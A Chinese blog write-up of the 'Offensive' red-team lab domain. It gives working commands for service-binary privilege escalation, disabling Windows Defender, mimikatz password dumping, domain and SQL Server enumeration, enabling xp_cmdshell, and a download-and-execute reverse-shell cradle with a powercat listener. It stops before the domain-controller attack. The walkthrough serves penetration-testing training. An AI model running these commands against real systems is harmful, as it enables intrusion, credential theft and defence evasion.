Offensive是国外红队培训时使用的一套环境，本文就该环境来一个WriteUp讲解，文末会放出该环境的链接。  
**环境拓扑图如下，该环境是一个域环境，最终的目的是获得域控的权限**  
我们现在已经获得了Win10主机(192.168.159.10)的权限。  
执行以下命令，可以看到，该机[主机名](https://so.csdn.net/so/search?q=%E4%B8%BB%E6%9C%BA%E5%90%8D&spm=1001.2101.3001.7020)为：Client1，当前用户为：offensive\\alice，由此可知，该机器处于域环境 offensive 下。再查看该机器管理员组，发现当前用户不在管理员组中。

```
hostname      whoami net localgroup administrators`

*   1
*   2
*   3
```


![在这里插入图片描述](https://img-blog.csdnimg.cn/20191203225120970.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

Windows提权
---------

于是，我们需要提权。但是由于该主机是比较新的Win10系统，所以无法利用内核漏洞提权。该机器桌面上有一个tool目录，里面有一堆的工具。环境搭建者希望我们利用这些工具来进行下一步的域环境渗透。看到了PowerUp.ps1，于是想到了利用该[PowerShell](https://so.csdn.net/so/search?q=PowerShell&spm=1001.2101.3001.7020)脚本来提权。关于Windows提权，传送门：  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20191203220142256.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)  
我们执行以下命令来加载运行PowerUp.ps1脚本的 Invoke-allChecks 模块。有关于powershell语句的用法：[PowerShell使用浅析](https://blog.csdn.net/qq_36119192/article/details/103021617) ，有关于PowerUp.ps1脚本的用法：[PowerUp.ps1脚本的使用](https://blog.csdn.net/qq_36119192/article/details/103103880#PowerUp.ps1%E8%84%9A%E6%9C%AC%E7%9A%84%E4%BD%BF%E7%94%A8)

```
Import-Module .\PowerUp.ps1   #导入PowerUp.ps1脚本 Invoke-AllChecks -verbose     #执行该脚本下的Invoke-AllChecks模块`

*   1
*   2
```


![在这里插入图片描述](https://img-blog.csdnimg.cn/20191203225331367.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)  
从执行该脚本输出的结果来看，我们可以利用下面这个危险的服务进行提权，名字都叫 VulnService 了，当然真实环境肯定不会这样命名。  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20191203225350253.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)  
于是，我们执行下面的命令进行提权

```
write-servicebinary -servicename vulnservice -username "offensive\alice" -password Password!  #该命令会在本目录下生成一个service.exe文件，该文件启动时会将用户offensive\alice提权到管理员组内。需要注意的是，这里的username必须是域内已经存在的用户，而password的话，则随便填，可以是这个域用户的正确密码，也可以随便指定密码，这对该域用户的密码无影响 cp .\service.exe "c:\program files\vuln service\vulnservice.exe"  #复制本路径下的service.exe文件到指定的程序`

*   1
*   2
```


![在这里插入图片描述](https://img-blog.csdnimg.cn/20191203225542671.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)  
然后重启系统，重启后会发现 offensive\\alice 在管理员组内了。(当然实际场景不可能让你重启系统的)  
![在这里插入图片描述](https://img-blog.csdnimg.cn/2019120322572328.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

Mimikatz获取明文密码
--------------

在提权至管理员权限后，我们可以运行mimikatz来获取位于内存中的密码，执行以下命令。在执行mimikatz之前，必须先执行命令关闭windows自带的defender防火墙，否则defender会杀掉mimikatz。

**注**：以下命令的执行需要在powershell的管理模式打开，也就是右键，以管理员权限打开powershell

```
Set-MpPreference -disablerealtimeMonitoring $true     #关闭windows自带的defender防火墙 cd C:\Users\alice\Desktop\tools\mimikatz_trunk\x64    #切换到mimikatz64位的目录下 .\mimikatz.exe             #运行mimikatz privilege::debug           #提权 sekurlsa::logonpasswords   #获取明文密码`

*   1
*   2
*   3
*   4
*   5
```


因为此次是靶机环境，我们事先知道账号密码，所以这里获得的账号密码对我们来说并没有多大用处  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20191203230201561.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

域信息收集
-----

加载PowerView.ps1脚本来进行域信息收集，关于PowerView.ps1脚本的使用，传送门：[PowerView.ps1脚本的使用](https://blog.csdn.net/qq_36119192/article/details/103103880#PowerView.ps1%E8%84%9A%E6%9C%AC%E7%9A%84%E4%BD%BF%E7%94%A8)

```
Import-Module .\PowerView.ps1    #导入PowerView.ps1脚本 Get-NetDomain       #获得域信息 Get-NetDomainController  #获得域控信息 Get-NetUser | select name  #获得域内的用户 Get-NetGroup | select name   #获得域内的组 Get-NetGroup *admin* | select name   #获得域内组中带有admin的 Get-NetGroup -UserName Alice   #获得域内组中用户alice的信息 Get-NetGroup "Domain Admins"   #查看"Domain Admins"组的信息 Get-NetComputer | select name   #获得域内主机的名字`

*   1
*   2
*   3
*   4
*   5
*   6
*   7
*   8
*   9
```


从以下我们可以收集到以下信息：

```
域名：offensive.local 域控名：dc.offensive.local 域控ip：192.168.159.200 域控系统：Windows Server2016数据中心版 域用户：administrator alice dbuser1 dbadmin 域内的组：好多，就不一一列举了 域内机器的名称：dc  、 SQL1 、CLIENT1 、OFFENSIVE-SQL1`

*   1
*   2
*   3
*   4
*   5
*   6
*   7
```


![在这里插入图片描述](https://img-blog.csdnimg.cn/20191203230850587.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20191203231007280.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20191203231124968.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20191203231230261.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

内网横向移动
------

接下来我们就要开始内网横向移动了。tools目录下有个PowerUpSQL文件夹，该PowerUpSQL文件夹内的PowerUpSQL.ps1脚本是用来探测SQLServer服务的。我们可以用此脚本探测内网中存在SQLServer服务的主机  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20191205153332474.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)  
我们执行以下命令

```
Import-Module .\PowerUpSQL.ps1    				#导入PowerUpSQL.ps1脚本  Get-SQLInstanceDomain | Get-SQLConnectionTest  #发现SQLInstance实例并检查其是否可访问  Get-SQLServerInfo -Instance Offensive-SQL1     #收集实例offensive-SQL1的详细信息  Invoke-SQLAudit -Instance Offensive-SQL1 -verbose  #自动扫描SQLServer实例是否配置错误`

*   1
*   2
*   3
*   4
```


从下面 offensive-SQL1实例的详细信息我们可以看到，该SQLServer可以用Windows认证和SQLServer认证登录  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20191205153629821.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20191205153643458.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)  
然后使用PowerView.ps1脚本去查找当前域内当前用户可以登录的机器  
![在这里插入图片描述](https://img-blog.csdnimg.cn/2019120515342717.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)  
然后我们使用xp\_cmdshell来执行 whoami 命令，发现 xp\_cmdshell被禁止了  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20191205153437195.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)  
于是我们执行以下命令打开xp\_cmdshell，成功执行whoami命令，得知当前用户为 offensive\\dbadmin

```
EXEC sp_configure 'show advanced options',1 RECONFIGURE EXEC sp_configure 'xp_cmdshell',1 RECONFIGURE EXEC master..xp_cmdshell 'whoami'`

*   1
*   2
*   3
*   4
*   5
```


![在这里插入图片描述](https://img-blog.csdnimg.cn/20191205153454836.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_12,color_FFFFFF,t_70)  
然后我们准备执行命令，反弹一个shell回来  
首先我们在本机导入powercat.ps1脚本，然后进行监听

```
Import-Module .\powercat.ps1 powercat -l -v -p 4444 -t 1000`

*   1
*   2
```


然后在本机利用HFS开启一个http服务  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20191206222243678.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)  
随后，我们在HeidiSQL中执行以下命令

```
EXEC master..xp_cmdshell 'powershell "iex(New-Object Net.WebClient).DownloadString(''http://192.168.159.10/Invoke-PowerShellTcpOneLine_4444.ps1'')"'`

*   1
```


随后，我们的powercat监听就能接受到反弹过来的shell了。  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20191211225815830.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)  
然后关闭Windows自带的Defender防火墙  
![在这里插入图片描述](https://img-blog.csdnimg.cn/2019120822375688.png)  
创建temp目录，进入该目录，然后从我们服务器下载 mimikatz.exe

```
iwr -uri http://192.168.159.10/mimikatz.exe -outfile mimikatz.exe -usebasicparsing`

*   1
```


![在这里插入图片描述](https://img-blog.csdnimg.cn/20191211230239204.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)  
执行 以下命令，获取账号密码明文，至此，我们已经完全掌控了Offensive-SQL1这台服务器

```
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit`

*   1
```


![在这里插入图片描述](https://img-blog.csdnimg.cn/20191208223922452.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

攻陷域控
----

那么，现在我们就需要去攻击域控了。未完待续。。